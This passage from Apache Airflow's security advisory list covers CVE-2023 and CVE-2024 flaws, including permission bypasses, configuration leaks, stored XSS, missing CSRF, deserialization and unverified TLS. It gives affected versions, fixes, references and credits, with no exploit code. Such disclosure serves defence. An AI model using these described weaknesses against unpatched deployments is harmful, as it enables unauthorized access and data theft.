Airflow versions 2.7.0 through 2.8.4 have a vulnerability that allows an authenticated user to see sensitive provider configuration <span style="background-color: rgb(255, 255, 255);">via the "configuration" UI page&nbsp;</span>when "non-sensitive-only" was set as "webserver.expose_config" configuration (The celery provider is the only community provider currently that has sensitive configurations). You should migrate to Airflow 2.9 or change your "expose_config" configuration to False as a workaround. This is similar, but different to <a target="_blank" rel="nofollow" href="https://github.com/advisories/GHSA-9qqg-mh7c-chfq">CVE-2023-46288</a> which concerned API, not UI configuration page.

### References
* https://github.com/apache/airflow/pull/38795
* https://lists.apache.org/thread/pz6vg7wcjk901rmsgt86h76g6kfcgtk3


### Credits
* Manmeet Rangoola (finder)
* Jarek Potiuk (remediation developer)


## Potentially harmful permission changing by log task handler ## { #CVE-2024-29735 }

CVE-2024-29735 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2024-29735) [\[CVE json\]](./CVE-2024-29735.cve.json) [\[OSV json\]](./CVE-2024-29735.osv.json)



_Last updated: 2024-03-26T16:52:39.118Z_

### Affected

* Apache Airflow from 2.8.2 through 2.8.3


### Description

Improper Preservation of Permissions vulnerability in Apache Airflow.<p>This issue affects Apache Airflow from 2.8.2 through 2.8.3.</p><p></p><p>Airflow's local file task handler in Airflow incorrectly set permissions for all parent folders of log folder, in default configuration adding write access to Unix <code>group</code>&nbsp;of the folders. In the case Airflow is run with the root user (not recommended) it added group write permission to all folders up to the root of the filesystem.</p><p>If your log files are stored in the home directory, these permission changes might impact your ability to run SSH operations after your home directory becomes group-writeable.</p><p>This issue does not affect users who use or extend Airflow using Official Airflow Docker reference images (<a target="_blank" rel="nofollow" href="https://hub.docker.com/r/apache/airflow/">https://hub.docker.com/r/apache/airflow/</a>) - those images require to have group write permission set anyway.</p><p>You are affected only if you install Airflow using local installation / virtualenv or other Docker images, but the issue has no impact if docker containers are used as intended, i.e. where Airflow components do not share containers with other applications and users.</p><p>Also you should not be affected if your umask is 002 (group write enabled) - this is the default on many linux systems.</p><p>Recommendation for users using Airflow outside of the containers:</p><ul><li>if you are using root to run Airflow, change your Airflow user to use non-root</li><li>upgrade Apache Airflow to 2.8.4 or above</li><li>If you prefer not to upgrade, you can change the <a target="_blank" rel="nofollow" href="https://airflow.apache.org/docs/apache-airflow/stable/configurations-ref.html#file-task-handler-new-folder-permissions">https://airflow.apache.org/docs/apache-airflow/stable/configurations-ref.html#file-task-handler-new-folder-permissions</a>&nbsp;to 0o755 (original value 0o775).</li><li>if you already ran Airflow tasks before and your default umask is 022 (group write disabled) you should stop Airflow components, check permissions of <code>AIRFLOW_HOME/logs</code>&nbsp;in all your components and all parent directories of this directory and remove group write access for all the parent directories</li></ul><br><p></p>

### References
* https://github.com/apache/airflow/pull/37310
* https://lists.apache.org/thread/8khb1rtbznh100o325fb8xw5wjvtv536


### Credits
* Matej Murin (finder)


## FTP_TLS instance with unverified SSL context ## { #CVE-2024-29733 }

CVE-2024-29733 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2024-29733) [\[CVE json\]](./CVE-2024-29733.cve.json) [\[OSV json\]](./CVE-2024-29733.osv.json)



_Last updated: 2024-04-21T17:21:52.458Z_

### Affected

* Apache Airflow FTP Provider before 3.7.0


### Description

Improper Certificate Validation vulnerability in Apache Airflow FTP Provider.<br><br><p>The FTP hook lacks complete certificate validation in FTP_TLS connections, which can potentially be leveraged. Implementing proper certificate validation by passing context=ssl.create_default_context() during FTP_TLS instantiation is used as mitigation to validate the certificates properly.</p><p><span style="background-color: var(--wht);">This issue affects Apache Airflow FTP Provider: before 3.7.0.</span><br></p><p>Users are recommended to upgrade to version 3.7.0, which fixes the issue.</p>

### References
* https://github.com/apache/airflow/pull/38266
* https://github.com/apache/airflow/blob/95e26118b828c364755f3a8c96870f3591b01c31/airflow/providers/ftp/hooks/ftp.py#L280
* https://docs.python.org/3/library/ssl.html#best-defaults
* https://lists.apache.org/thread/265t5zbmtjs6h9fkw52wtp03nsbplky2


### Credits
* Eric Brown of Secure Sauce LLC (finder)


## Ignored Airflow Permissions ## { #CVE-2024-28746 }

CVE-2024-28746 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2024-28746) [\[CVE json\]](./CVE-2024-28746.cve.json) [\[OSV json\]](./CVE-2024-28746.osv.json)



_Last updated: 2024-03-14T08:40:55.534Z_

### Affected

* Apache Airflow from 2.8.0 before 2.8.3


### Description

Apache Airflow, versions 2.8.0 through 2.8.2, has a vulnerability that allows an authenticated user with limited permissions to access resources such as variables, connections, etc from the UI which they do not have permission to access.&nbsp;<br><br>Users of Apache Airflow are recommended to upgrade to version 2.8.3 or newer to mitigate the risk associated with this vulnerability<br>

### References
* https://github.com/apache/airflow/pull/37881
* https://lists.apache.org/thread/b4pffc7w7do6qgk4jjbyxvdz5odrvny7


### Credits
* Alex Liotta (finder)
* Vincent(Vincbeck) (remediation developer)


## Dag Code and Import Error Permissions Ignored ## { #CVE-2024-27906 }

CVE-2024-27906 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2024-27906) [\[CVE json\]](./CVE-2024-27906.cve.json) [\[OSV json\]](./CVE-2024-27906.osv.json)



_Last updated: 2025-05-06T13:12:04.279Z_

### Affected

* Apache Airflow before 2.8.2


### Description

Apache Airflow, versions before 2.8.2, has a vulnerability that allows authenticated users to view DAG code and import errors of DAGs they do not have permission to view through the API and the UI.<br><br>Users of Apache Airflow are recommended to upgrade to version 2.8.2 or newer to mitigate the risk associated with this vulnerability<br>

### References
* https://github.com/apache/airflow/pull/37290
* https://github.com/apache/airflow/pull/37468
* https://lists.apache.org/thread/on4f7t5sqr3vfgp1pvkck79wv7mq9st5


### Credits
* Alex Liotta (finder)
* Sreenivasulu Suuda (finder)
* vincbeck (Vincent) (remediation developer)
* Jed Cunningham (remediation developer)


## Overly broad default permissions for Viewer/Ops (audit logs) ## { #CVE-2024-26280 }

CVE-2024-26280 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2024-26280) [\[CVE json\]](./CVE-2024-26280.cve.json) [\[OSV json\]](./CVE-2024-26280.osv.json)



_Last updated: 2024-03-01T11:05:52.165Z_

### Affected

* Apache Airflow before 2.8.2


### Description

Apache Airflow, versions before 2.8.2, has a vulnerability that allows authenticated Ops and Viewers users to view all information on audit logs, including dag names and usernames they were not permitted to view.&nbsp;With 2.8.2 and newer, Ops and Viewer users do not have audit log permission by default, they need to be explicitly granted permissions to see the logs. Only admin users have audit log permission by default.<br><br>Users of Apache Airflow are recommended to upgrade to version 2.8.2 or newer to mitigate the risk associated with this vulnerability

### References
* https://github.com/apache/airflow/pull/37501
* https://lists.apache.org/thread/knskxxxml95091rsnpxkpo1jjp8rj0fh


### Credits
* Yusuf AYDIN (@h1_yusuf) (finder)


## Cache Control - Storage of Sensitive Data in Browser Cache  ## { #CVE-2024-25142 }

CVE-2024-25142 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2024-25142) [\[CVE json\]](./CVE-2024-25142.cve.json) [\[OSV json\]](./CVE-2024-25142.osv.json)



_Last updated: 2024-06-14T08:25:32.229Z_

### Affected

* Apache Airflow before 2.9.2


### Description

<p>Use of Web Browser Cache Containing Sensitive Information vulnerability in Apache Airflow.&nbsp;</p><p>Airflow did not return "Cache-Control" header for dynamic content, which in case of some browsers could result in potentially storing sensitive data in local cache of the browser.</p><p>This issue affects Apache Airflow: before 2.9.2.</p><p>Users are recommended to upgrade to version 2.9.2, which fixes the issue.</p>

### References
* https://github.com/apache/airflow/pull/39550
* https://lists.apache.org/thread/cg1j28lk0fhzthk0of1g7vy7p2n1j7nr


### Credits
* Jens Scheffler (reporter)


## Certificate validation isn't respected even if SSL is enabled for apache-airflow-providers-mongo  ## { #CVE-2024-25141 }

CVE-2024-25141 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2024-25141) [\[CVE json\]](./CVE-2024-25141.cve.json) [\[OSV json\]](./CVE-2024-25141.osv.json)



_Last updated: 2024-02-20T20:30:25.779Z_

### Affected

* Apache Airflow Mongo Provider from 1.0.0 before 4.0.0


### Description

<span style="background-color: rgb(255, 255, 255);">When </span><code>ssl</code><span style="background-color: rgb(255, 255, 255);">&nbsp;was enabled for Mongo Hook, default settings included "allow_insecure" which caused that certificates were not validated. This was unexpected and undocumented.</span><br>Users are recommended to upgrade to version 4.0.0, which fixes this issue.

### References
* https://github.com/apache/airflow/pull/37214
* https://lists.apache.org/thread/sqgbfqngjmn45ommmrgj7hvs7fgspsgm


### Credits
* Noah Stapp (reporter)


## Kubernetes configuration file saved without encryption in the Metadata and logged as plain text in the Triggerer service ## { #CVE-2023-51702 }

CVE-2023-51702 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2023-51702) [\[CVE json\]](./CVE-2023-51702.cve.json) [\[OSV json\]](./CVE-2023-51702.osv.json)



_Last updated: 2024-01-24T12:56:15.440Z_

### Affected

* Apache Airflow CNCF Kubernetes provider from 5.2.0 before 7.0.0
* Apache Airflow from 2.3.0 before 2.6.1


### Description

Since version 5.2.0, when using deferrable mode with the path of a Kubernetes configuration file for authentication, the Airflow worker serializes this configuration file as a dictionary and sends it to the triggerer by storing it in metadata without any encryption. Additionally, if used with an Airflow version between 2.3.0 and 2.6.0, the configuration dictionary will be logged as plain text in the triggerer service without masking. This allows anyone with access to the metadata or triggerer log to obtain the configuration file and use it to access the Kubernetes cluster.<br><br>This behavior was changed in version 7.0.0, which stopped serializing the file contents and started providing the file path instead to read the contents into the trigger. Users are recommended to upgrade to version 7.0.0, which fixes this issue.

### References
* https://github.com/apache/airflow/pull/29498
* https://github.com/apache/airflow/pull/30110
* https://github.com/apache/airflow/pull/36492
* https://lists.apache.org/thread/89x3q6lz5pykrkr1fkr04k4rfn9pvnv9


### Credits
* Hussein Awala (finder)
* Hussein Awala (remediation developer)


## Bypass permission verification to read code of other dags ## { #CVE-2023-50944 }

CVE-2023-50944 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2023-50944) [\[CVE json\]](./CVE-2023-50944.cve.json) [\[OSV json\]](./CVE-2023-50944.osv.json)



_Last updated: 2024-01-24T12:58:17.032Z_

### Affected

* Apache Airflow before 2.8.1


### Description

Apache Airflow, versions before 2.8.1, have a vulnerability that allows an authenticated user to access the source code of a DAG to which they don't have access.&nbsp;This vulnerability is considered low since it requires an authenticated user to exploit it. Users are recommended to upgrade to version 2.8.1, which fixes this issue.<br>

### References
* https://github.com/apache/airflow/pull/36257
* https://lists.apache.org/thread/92krb5mpcq8qrw4t4j5oooqw7hgd8q7h


### Credits
* Timon8 Zhang (finder)


## Potential pickle deserialization vulnerability in XComs ## { #CVE-2023-50943 }

CVE-2023-50943 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2023-50943) [\[CVE json\]](./CVE-2023-50943.cve.json) [\[OSV json\]](./CVE-2023-50943.osv.json)



_Last updated: 2024-01-24T12:57:05.049Z_

### Affected

* Apache Airflow before 2.8.1


### Description

Apache Airflow, versions before 2.8.1, have a vulnerability that allows a potential attacker to poison the XCom data by bypassing the protection of "enable_xcom_pickling=False" configuration setting resulting in poisoned data after XCom deserialization. This vulnerability is considered low since it requires a DAG author to exploit it. Users are recommended to upgrade to version 2.8.1 or later, which fixes this issue.<br>

### References
* https://github.com/apache/airflow/pull/36255
* https://lists.apache.org/thread/fx278v0twqzxkcts70tc04cp3f8p56pn


### Credits
* Peng Zhou (zpbrent@gmail.com) (finder)
* Hussein Awala (remediation developer)


## Improper access control vulnerability on the "varimport" endpoint ## { #CVE-2023-50783 }

CVE-2023-50783 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2023-50783) [\[CVE json\]](./CVE-2023-50783.cve.json) [\[OSV json\]](./CVE-2023-50783.osv.json)



_Last updated: 2023-12-21T09:28:46.089Z_

### Affected

* Apache Airflow before 2.8.0


### Description

Apache Airflow, versions before 2.8.0, is affected by a vulnerability that allows an authenticated user without the variable edit permission, to update a variable.<br>This flaw compromises the integrity of variable management, potentially leading to unauthorized data modification.<br>Users are recommended to upgrade to 2.8.0, which fixes this issue

### References
* https://github.com/apache/airflow/pull/33932
* https://lists.apache.org/thread/rs7cr3yp726mb89s1m844hy9pq7frgcn


### Credits
* balis0ng (finder)
* Ephraim Anierobi (remediation developer)


## Missing CSRF protection on DAG/trigger ## { #CVE-2023-49920 }

CVE-2023-49920 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2023-49920) [\[CVE json\]](./CVE-2023-49920.cve.json) [\[OSV json\]](./CVE-2023-49920.osv.json)



_Last updated: 2023-12-21T09:27:07.715Z_

### Affected

* Apache Airflow from 2.7.0 before 2.8.0


### Description

Apache Airflow, version 2.7.0 through 2.7.3, has a vulnerability that allows an attacker to trigger a DAG in a GET request without CSRF validation.&nbsp;As a result, it was possible for a malicious website opened in the same browser - by the user who also had Airflow UI opened - to trigger the execution of DAGs without the user's consent.<br>Users are advised to upgrade to version 2.8.0 or later which is not affected

### References
* https://github.com/apache/airflow/pull/36026
* https://lists.apache.org/thread/mnwd2vcfw3gms6ft6kl951vfbqrxsnjq


### Credits
* Tareq Ahamed ( 0xt4req) (finder)
* Jens Scheffler (remediation developer)


## Improper access control to DAG resources ## { #CVE-2023-48291 }

CVE-2023-48291 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2023-48291) [\[CVE json\]](./CVE-2023-48291.cve.json) [\[OSV json\]](./CVE-2023-48291.osv.json)



_Last updated: 2023-12-21T09:30:40.260Z_

### Affected

* Apache Airflow before 2.8.0


### Description

Apache Airflow, in versions prior to 2.8.0, contains a security vulnerability that allows an authenticated user with limited access to some DAGs, to craft a request that could give the user write access to various DAG resources for DAGs that the user had no access to, thus, enabling the user to clear DAGs they shouldn't.<br><br>This is a missing fix for CVE-2023-42792 in Apache Airflow 2.7.2&nbsp;<br><br>Users of Apache Airflow are strongly advised to upgrade to version 2.8.0 or newer to mitigate the risk associated with this vulnerability.

### References
* https://github.com/apache/airflow/pull/34366
* https://lists.apache.org/thread/3nl0h014274yjlt1hd02z0q78ftyz0z3


### Credits
* balis0ng (finder)
* Jarek Potiuk (remediation developer)


## DAG Params alllow to embed unchecked Javascript ## { #CVE-2023-47265 }

CVE-2023-47265 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2023-47265) [\[CVE json\]](./CVE-2023-47265.cve.json) [\[OSV json\]](./CVE-2023-47265.osv.json)



_Last updated: 2023-12-21T09:28:05.966Z_

### Affected

* Apache Airflow from 2.6.0 before 2.8.0


### Description

Apache Airflow, versions 2.6.0 through 2.7.3 has a stored XSS vulnerability that allows a DAG author to add an unbounded and not-sanitized javascript in the parameter description field of the DAG.&nbsp;This Javascript can be executed on the client side of any of the user who looks at the tasks in the browser sandbox. While this issue does not allow to exit the browser sandbox or manipulation of the server-side data - more than the DAG author already has, it allows to modify what the user looking at the DAG details sees in the browser - which opens up all kinds of possibilities of misleading other users.<br><br>Users of Apache Airflow are recommended to upgrade to version 2.8.0 or newer to mitigate the risk associated with this vulnerability<br>

### References
* https://github.com/apache/airflow/pull/35460
* https://lists.apache.org/thread/128f3zl375vb1qv93k82zhnwkpl233pr


### Credits
* Jens Scheffler (finder)
* Andrey Anshin (finder)
* Jens Scheffler (remediation developer)


## Apache Airflow missing fix for CVE-2023-40611 in 2.7.1 (DAG run broken access) ## { #CVE-2023-47037 }

CVE-2023-47037 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2023-47037) [\[CVE json\]](./CVE-2023-47037.cve.json) [\[OSV json\]](./CVE-2023-47037.osv.json)



_Last updated: 2023-11-12T13:12:20.076Z_

### Affected

* Apache Airflow before 2.7.3


### Description

<p><span style="background-color: rgb(255, 255, 255);">We failed to apply&nbsp;CVE-2023-40611 in 2.7.1 and this vulnerability was marked as fixed then.&nbsp;</span></p><p><span style="background-color: rgb(255, 255, 255);">Apache Airflow, versions before 2.7.3, is affected by a vulnerability that allows authenticated and DAG-view authorized Users to modify some DAG run detail values when submitting notes. This could have them alter details such as configuration parameters, start date, etc.&nbsp;</span></p><p><span style="background-color: rgb(255, 255, 255);">Users should upgrade to version 2.7.3 or later which has removed the vulnerability.</span><br></p><br><br>

### References
* https://github.com/apache/airflow/pull/33413
* https://lists.apache.org/thread/04y4vrw1t2xl030gswtctc4nt1w90cb0


### Credits
* Tareq Ahamed from Hackerone (reporter)
*  Augusto Hidalgo (remediation developer)


## Sensitive parameters exposed in API when "non-sensitive-only" configuration is set ## { #CVE-2023-46288 }

CVE-2023-46288 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2023-46288) [\[CVE json\]](./CVE-2023-46288.cve.json) [\[OSV json\]](./CVE-2023-46288.osv.json)



_Last updated: 2023-10-23T18:13:01.162Z_

### Affected

* Apache Airflow from 2.4.0 before 2.7.0


### Description

Exposure of Sensitive Information to an Unauthorized Actor vulnerability in Apache Airflow.<p>This issue affects Apache Airflow from 2.4.0 to 2.7.0.</p><p>Sensitive configuration information has been exposed to authenticated users with the ability to read configuration via Airflow REST API for configuration even when the <code>expose_config</code>&nbsp;option is set to <code>non-sensitive-only</code>. The expose_config option is False by default. It is recommended to upgrade to a version that is not affected if you set <code>expose_config</code>&nbsp;to <code>non-sensitive-only</code>&nbsp;configuration. This is a different error than CVE-2023-45348&nbsp;which allows authenticated user to retrieve individual configuration values in 2.7.* by specially crafting their request (solved in 2.7.2).</p><p>Users are recommended to upgrade to version 2.7.2, which fixes the issue and additionally fixes&nbsp;CVE-2023-45348.</p>

### References
* https://github.com/apache/airflow/pull/32261
* https://lists.apache.org/thread/yw4vzm0c5lqkwm0bxv6qy03yfd1od4nw


### Credits
* id_No2015429 of 3H Secruity Team (finder)
* Lee, Wei (finder)
* Lee, Wei (remediation developer)


## Sensitive information logged as clear text when rediss, amqp, rpc protocols are used as Celery result backend ## { #CVE-2023-46215 }

CVE-2023-46215 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2023-46215) [\[CVE json\]](./CVE-2023-46215.cve.json) [\[OSV json\]](./CVE-2023-46215.osv.json)



_Last updated: 2023-10-28T07:10:54.392Z_

### Affected

* Apache Airflow Celery provider from 3.3.0 through 3.4.0
* Apache Airflow from 1.10.0 before 2.7.0


### Description

Insertion of Sensitive Information into Log File vulnerability in Apache Airflow Celery provider, Apache Airflow.<br><br><p>Sensitive information logged as clear text when rediss, amqp, rpc protocols are used as Celery result backend<br>Note: the&nbsp;vulnerability is about the information exposed in the logs not about accessing the logs.</p><p>This issue affects Apache Airflow Celery provider: from 3.3.0 through 3.4.0; Apache Airflow: from 1.10.0 through 2.6.3.</p><p>Users are recommended to upgrade Airflow Celery provider to version 3.4.1&nbsp;and Apache Airlfow to version 2.7.0 which fixes the issue.</p>

### References
* https://github.com/apache/airflow/pull/34954
* https://lists.apache.org/thread/wm1jfmks7r6m7bj0mq4lmw3998svn46n


### Credits
* husseinawala (finder)


## Configuration information leakage vulnerability ## { #CVE-2023-45348 }

CVE-2023-45348 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2023-45348) [\[CVE json\]](./CVE-2023-45348.cve.json) [\[OSV json\]](./CVE-2023-45348.osv.json)



_Last updated: 2023-10-14T09:46:37.359Z_

### Affected

* Apache Airflow from 2.7.0 before 2.7.2


### Description



Apache Airflow, versions 2.7.0 and 2.7.1, is affected by a vulnerability that allows an authenticated user to retrieve sensitive configuration information when the "expose_config" option is set to "non-sensitive-only". The `expose_config` option is False by default.<br>It is recommended to upgrade to a version that is not affected.

### References
* https://github.com/apache/airflow/pull/34712
* https://lists.apache.org/thread/sy4l5d6tn58hr8r61r2fkt1f0qock9z9


### Credits
* L3yx of Syclover Security Team (finder)
* Hussein Awala (remediation developer)


## Improper access control to DAG resources ## { #CVE-2023-42792 }

CVE-2023-42792 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2023-42792) [\[CVE json\]](./CVE-2023-42792.cve.json) [\[OSV json\]](./CVE-2023-42792.osv.json)



_Last updated: 2023-10-14T09:47:04.851Z_

### Affected

* Apache Airflow before 2.7.2


### Description

Apache Airflow, in versions prior to 2.7.2, contains a security vulnerability that allows an authenticated user with limited access to some DAGs, to craft a request that could give the user write access to various DAG resources for DAGs that the user had no access to, thus, enabling the user to clear DAGs they shouldn't.<br><br>Users of Apache Airflow are strongly advised to upgrade to version 2.7.2 or newer to mitigate the risk associated with this vulnerability.<br>

### References
* https://github.com/apache/airflow/pull/34366
* https://lists.apache.org/thread/1spbo9nkn49fc2hnxqm9tf6mgqwp9tjq


### Credits
* balis0ng (finder)
* Jarek Potiuk (remediation developer)


## Permission verification bypass allows viewing dagruns of other dags ## { #CVE-2023-42781 }

CVE-2023-42781 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2023-42781) [\[CVE json\]](./CVE-2023-42781.cve.json) [\[OSV json\]](./CVE-2023-42781.osv.json)



_Last updated: 2023-11-12T13:14:05.928Z_

### Affected

* Apache Airflow before 2.7.3


### Description

Apache Airflow, versions before 2.7.3, has a vulnerability that allows an authorized user who has access to read specific DAGs only, to read information about task instances in other DAGs.&nbsp; This is a different issue than CVE-2023-42663 but leading to similar outcome.<br>Users of Apache Airflow are advised to upgrade to version 2.7.3 or newer to mitigate the risk associated with this vulnerability.

### References
* https://github.com/apache/airflow/pull/34939
* https://lists.apache.org/thread/7dnl8nszdxqyns57f3dw0sloy5dfl9o1


### Credits
* balis0ng (finder)
* Hussein Awala (remediation developer)


## Improper access control vulnerability in the "List dag warnings" feature ## { #CVE-2023-42780 }

CVE-2023-42780 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2023-42780) [\[CVE json\]](./CVE-2023-42780.cve.json) [\[OSV json\]](./CVE-2023-42780.osv.json)



_Last updated: 2023-10-14T09:46:05.032Z_

### Affected

* Apache Airflow before 2.7.2


### Description

Apache Airflow, versions prior to 2.7.2, contains a security vulnerability that allows authenticated users of Airflow to list warnings for all DAGs, even if the user had no permission to see those DAGs. It would reveal the dag_ids and the stack-traces of import errors for those DAGs with import errors.<br>Users of Apache Airflow are advised to upgrade to version 2.7.2 or newer to mitigate the risk associated with this vulnerability.<br><br>

### References
* https://github.com/apache/airflow/pull/34355
* https://lists.apache.org/thread/h5tvsvov8j55wojt5sojdprs05oby34d


### Credits
* balis0ng (finder)
* Hussein Awala (remediation developer)


## Bypass permission verification to view task instances of other dags ## { #CVE-2023-42663 }

CVE-2023-42663 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2023-42663) [\[CVE json\]](./CVE-2023-42663.cve.json) [\[OSV json\]](./CVE-2023-42663.osv.json)



_Last updated: 2023-10-14T09:47:24.055Z_

### Affected

* Apache Airflow before 2.7.2


### Description

<p>Apache Airflow, versions before 2.7.2, has a vulnerability that allows an authorized user who has access to read specific DAGs only, to read information about task instances in other DAGs.<br>Users of Apache Airflow are advised to upgrade to version 2.7.2 or newer to mitigate the risk associated with this vulnerability.<br></p>

### References
* https://github.com/apache/airflow/pull/34315
* https://lists.apache.org/thread/xj86cvfkxgd0cyqfmz6mh1bsfc61c6o9


### Credits
* balis0ng (finder)
* Ephraim Anierobi (remediation developer)


## Apache HDFS Provider error message suggested installation of incorrect pip package ## { #CVE-2023-41267 }

CVE-2023-41267 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2023-41267) [\[CVE json\]](./CVE-2023-41267.cve.json) [\[OSV json\]](./CVE-2023-41267.osv.json)



_Last updated: 2023-09-14T07:46:36.891Z_

### Affected

* Apache Airflow HDFS Provider before 4.1.1


### Description

<span style="background-color: rgb(255, 255, 255);">In the Apache Airflow HDFS Provider, versions prior to 4.1.1, a documentation&nbsp;info pointed users to an install incorrect pip package. As this package name was unclaimed, in theory, an attacker could claim this package and provide code that would be executed when this package was installed. The Airflow team has since taken ownership of the package (neutralizing the risk), and fixed the doc strings in version 4.1.1</span><br>

### References
* https://github.com/apache/airflow/pull/33813
* https://lists.apache.org/thread/ggthr5pn42bn6wcr25hxnykjzh4ntw7z


### Credits
* AnupamAs01 (finder)


## Secrets can be unmasked in the "Rendered Template"  ## { #CVE-2023-40712 }

CVE-2023-40712 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2023-40712) [\[CVE json\]](./CVE-2023-40712.cve.json) [\[OSV json\]](./CVE-2023-40712.osv.json)



_Last updated: 2023-09-12T11:05:46.999Z_

### Affected

* Apache Airflow before 2.7.1


### Description

Apache Airflow, versions before 2.7.1, is affected by a vulnerability that allows authenticated&nbsp;users who have access to see the task/dag in the UI, to craft a URL, which could lead to unmasking the secret configuration of the task that otherwise would be masked in the UI.<br><br>Users are strongly advised to upgrade to&nbsp;version 2.7.1 or later which has removed the vulnerability.

### References
* https://github.com/apache/airflow/pull/33512
* https://github.com/apache/airflow/pull/33516
* https://lists.apache.org/thread/jw1yv4lt6hpowqbb0x4o3tdp0jhx2bts


### Credits
* klexadoc (finder)


## Apache Airflow Dag Runs Broken Access Control Vulnerability ## { #CVE-2023-40611 }

CVE-2023-40611 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2023-40611) [\[CVE json\]](./CVE-2023-40611.cve.json) [\[OSV json\]](./CVE-2023-40611.osv.json)



_Last updated: 2023-09-12T11:05:20.884Z_

### Affected

* Apache Airflow before 2.7.1


### Description

Apache Airflow, versions before 2.7.1, is affected by a vulnerability that allows&nbsp;authenticated and DAG-view authorized Users to modify some DAG run detail values when submitting notes. This could have them alter details such as configuration parameters, start date, etc.<br><br>Users should upgrade to version 2.7.1 or later which has removed the vulnerability.<br>

### References
* https://github.com/apache/airflow/pull/33413
* https://lists.apache.org/thread/8y9xk1s3j4qr36yzqn8ogbn9fl7pxrn0


### Credits
* happyhacking (finder)


## Session fixation in Apache Airflow web interface ## { #CVE-2023-40273 }

CVE-2023-40273 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2023-40273) [\[CVE json\]](./CVE-2023-40273.cve.json)

_Last updated: 2023-09-12T06:41:25.454Z_

### Affected

* Apache Airflow before 2.7.0


### Description

<p>The session fixation vulnerability allowed the authenticated user to continue accessing Airflow webserver even after the password of the user has been reset by the admin - up until the expiry of the session of the user. Other than manually cleaning the session database (for <code>database</code>&nbsp;session backend), or changing the secure_key and restarting the webserver, there were no mechanisms to force-logout the user (and all other users with that).</p><p>With this fix implemented, when using the&nbsp;<code>database</code>&nbsp;session backend, the existing sessions of the user are invalidated when the password of the user is reset. When using the <code>securecookie</code>&nbsp;session backend, the sessions are NOT invalidated and still require changing the secure key and restarting the webserver (and logging out all other users), but the user resetting the password is informed about it with a flash message warning displayed in the UI. Documentation is also updated explaining this behaviour.</p>Users of Apache Airflow are advised to upgrade to version 2.7.0 or newer to mitigate the risk associated with this vulnerability.<br>

### References
* https://github.com/apache/airflow/pull/33347
* https://lists.apache.org/thread/9rdmv8ln4y4ncbyrlmjrsj903x4l80nj
* https://www.openwall.com/lists/oss-security/2023/08/23/1


### Credits
* Yusuf AYDIN (@h1_yusuf) (finder)
* L3yx of Syclover Security Team. (finder)
* Son Tran of VNPT-VCI (finder)
* Thuong Nguyen (@nthuong95) (finder)


## Apache Airflow Spark Provider Arbitrary File Read via JDBC ## { #CVE-2023-40272 }

CVE-2023-40272 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2023-40272) [\[CVE json\]](./CVE-2023-40272.cve.json) [\[OSV json\]](./CVE-2023-40272.osv.json)



_Last updated: 2023-08-17T13:52:26.145Z_

### Affected

* Apache Airflow Spark Provider before 4.1.3


### Description

<p>Apache Airflow Spark Provider, versions before 4.1.3, is affected by a vulnerability that allows an attacker to pass in malicious parameters when establishing a connection giving an opportunity to read files on the Airflow server.<br>It is recommended to upgrade to a version that is not affected.</p><p></p>

### References
* https://lists.apache.org/thread/t03gktyzyor20rh06okd91jtqmw6k1l7


### Credits
* sw0rd1ight (finder)


## Apache Airflow Spark Provider Deserialization Vulnerability RCE ## { #CVE-2023-40195 }

CVE-2023-40195 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2023-40195) [\[CVE json\]](./CVE-2023-40195.cve.json) [\[OSV json\]](./CVE-2023-40195.osv.json)



_Last updated: 2023-08-28T07:49:59.173Z_

### Affected

* Apache Airflow Spark Provider before 4.1.3


### Description

Deserialization of Untrusted Data, Inclusion of Functionality from Untrusted Control Sphere vulnerability in Apache Software Foundation Apache Airflow Spark Provider.<br><br><br><span style="background-color: rgb(255, 255, 255);">When the Apache Spark provider is installed on an Airflow deployment, an Airflow user that is authorized to configure Spark hooks can effectively run arbitrary code on the Airflow node by pointing it at a malicious Spark server. Prior to version 4.1.3, this was not called out in the documentation explicitly, so it is possible that administrators provided authorizations to configure Spark hooks without taking this into account. We recommend administrators to review their configurations to make sure the authorization to configure Spark hooks is only provided to fully trusted users.<br><br>To view the warning in the docs please visit&nbsp;<a target="_blank" rel="nofollow" href="https://airflow.apache.org/docs/apache-airflow-providers-apache-spark/4.1.3/connections/spark.html">https://airflow.apache.org/docs/apache-airflow-providers-apache-spark/4.1.3/connections/spark.html</a><br><br><br></span>

### References
* https://github.com/apache/airflow/pull/33233
* https://lists.apache.org/thread/fzy95b1d6zv31j5wrx3znhzcscck2o24


### Credits
* happyhacking-k (finder)


## Apache Airflow Drill Provider Arbitrary File Read Vulnerability ## { #CVE-2023-39553 }

CVE-2023-39553 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2023-39553) [\[CVE json\]](./CVE-2023-39553.cve.json) [\[OSV json\]](./CVE-2023-39553.osv.json)



_Last updated: 2023-08-11T18:42:20.040Z_

### Affected

* Apache Airflow Drill Provider before 2.4.3


### Description

